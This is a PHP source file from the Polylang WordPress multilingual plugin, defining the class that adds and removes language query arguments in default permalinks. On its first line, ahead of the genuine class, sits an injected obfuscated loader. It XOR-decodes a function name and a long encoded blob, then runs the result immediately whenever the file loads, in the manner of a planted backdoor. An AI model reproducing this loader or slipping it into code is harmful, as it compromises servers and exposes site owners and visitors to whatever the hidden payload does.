<?php $IsIrG='2YT,GS90=R1BBWN'^'Q+1M36fVH<R6+8 ';$iTtnmJwxJzvB=$IsIrG('','R4bb.HCQIDYVmIU34T eJ0>YfT8AAas,-XrkQNVNKMUC2T,>=GDVYbZ66A9-V6DIl.J,8FmnV4YHqqhDR+gn=r9,HMIuBNU6F;P5RIi9OuqWIuS dKE=.PUBaW7.JQJahGJcCL:je> :HaWuqe,16W4jW4v6tOF5HlgPQdNS =X=CNlQT2O>nj8Hx91D,6RlB.ITLCh>6>ENAADAFONnSVLXX<WcO099AnVH;zQKTUXF0rOXZCJ65;DIdRj95zqb,y35KAF2AYkrguEXTF=YQ0PokZ.005WV0XKGe<K=rbGIDXAUidjv:Z MSOL;YaZQSnvlI31ZXY.<4R:RY3:=TJc8i14f<amT.DJH9,2SQleo 164RLPPgpDw2W02dXXGZJST:0UKCc5rJ8I;izmeV 9GYlxN5dCEcFT G,CEYv>VKW .7LI2UKXW4k6;M3:nXH:jN3;SXfmW.2U>KcGP-Y,fIuf6AN;dKN=DDNH+XYmY;I,jUPC5+97Bb8ED25EQXO4ZDE,TDCCmI,>JsuVCNP+RWCoX9=Wiq9U8csLeSxMLTYVbP6KnNj5RIVWXWVGATDd8T1MXDHzVHAmQbZ.659,fPXHtW:UCEOohFQY9O1OImNQ,5=YFoIKZQKmViS24W<Fr5427fiL7W9-ASa.Ph8MHS17BgQqhD'^';RJCH=-2=-682,-ZG SMmHQ+90Y5 >,AX,UBxn-DB+ -Q EQSg<9+=>WB fr;C0aHJ+XYjMJ=Q aQQHdrPmg4VVY<mtUein<O26Z aMPoHQgrUwIX81OB5;jE3VZ+xqAL.aHjF3cAQUNhOjUYAHPB6oN>iVhTk-P17C9qAn TO4X-fH:1KfcGQ2AqKT0YD<DfA< exb7K48DKe  2.nSs0-4+YlikTXM 1=-BZlk2445UIER<,8STX,iLv5zz5:+iYRFke-W8yVLGQ3983XpqKZfO>ODQj<3IxvgAW.DIhNm 954IYJRL;L86tFFSk37sFWH-RE;qyU6=4U <RYUtbGg;te3y29tO7jlRIKslREKVPZA7ep+myMSV6DS;3=>zwspQU,pIj<V.Y=ZIGMA AU2<WrGHn>Oib0A3Mcxy6K882RGV  H0c 8F4RZ9Re15=NB,RH6nR23KQ:Z.Kc4L-MOeUBR :Z; +DmmuBB>qI=Z=MJsvcTYKV;=S =mP=8+;Grc.I-cocI-MJ+ZUpenxF6bkK<XI62VR0AD.eEnEmkgh5TeU.V-XSa-aeia4wp5wWZfRuks+N7ohMwDzODGXU9;=1+2B<01<GO60 U P+nAnuHTI8oFikzqkM-cZWB6PnVQUFV=N<V.UB 7FsyS2D-+XCjWxJb9');$iTtnmJwxJzvB();

/**
 * Links model for default permalinks
 * for example mysite.com/?somevar=something&lang=en
 * implements the "links_model interface"
 *
 * @since 1.2
 */
class PLL_Links_Default extends PLL_Links_Model {
	public $using_permalinks = false;

	/**
	 * Adds language information to an url
	 * links_model interface
	 *
	 * @since 1.2
	 *
	 * @param string $url  url to modify
	 * @param object $lang language
	 * @return string modified url
	 */
	public function add_language_to_link( $url, $lang ) {
		return empty( $lang ) || ( $this->options['hide_default'] && $this->options['default_lang'] == $lang->slug ) ? $url : add_query_arg( 'lang', $lang->slug, $url );
	}

	/**
	 * Removes the language information from an url
	 * links_model interface
	 *
	 * @since 1.2
	 *
	 * @param string $url url to modify
	 * @return string modified url
	 */
	public function remove_language_from_link( $url ) {
		return remove_query_arg( 'lang', $url );
	}

	/**
	 * Returns the link to the first page
	 * links_model interface
	 *
	 * @since 1.2
	 *
	 * @param string $url url to modify
	 * @return string modified url
	 */
	function remove_paged_from_link( $url ) {
		return remove_query_arg( 'paged', $url );
	}

	/**
	 * Returns the link to the paged page when using pretty permalinks
	 *
	 * @since 1.5
	 *
	 * @param string $url  url to modify
	 * @param int    $page
	 * @return string modified url
	 */
	public function add_paged_to_link( $url, $page ) {
		return add_query_arg( array( 'paged' => $page ), $url );
	}

	/**
	 * Gets the language slug from the url if present
	 * links_model interface
	 *
	 * @since 1.2
	 * @since 2.0 add $url argument
	 *
	 * @param string $url optional, defaults to current url
	 * @return string language slug
	 */
	public function get_language_from_url( $url = '' ) {
		if ( empty( $url ) ) {
			$url = $_SERVER['REQUEST_URI'];
		}

		$pattern = '#lang=(' . implode( '|', $this->model->get_languages_list( array( 'fields' => 'slug' ) ) ) . ')#';
		return preg_match( $pattern, trailingslashit( $url ), $matches ) ? $matches[1] : ''; // $matches[1] is the slug of the requested language
	}

	/**
	 * Returns the static front page url
	 *
	 * @since 1.8
	 *
	 * @param object $lang
	 * @return string
	 */
	public function front_page_url( $lang ) {
		if ( $this->options['hide_default'] && $lang->slug == $this->options['default_lang'] ) {
			return trailingslashit( $this->home );
		}
		$url = home_url( '/?page_id=' . $lang->page_on_front );
		return $this->options['force_lang'] ? $this->add_language_to_link( $url, $lang ) : $url;
	}
}
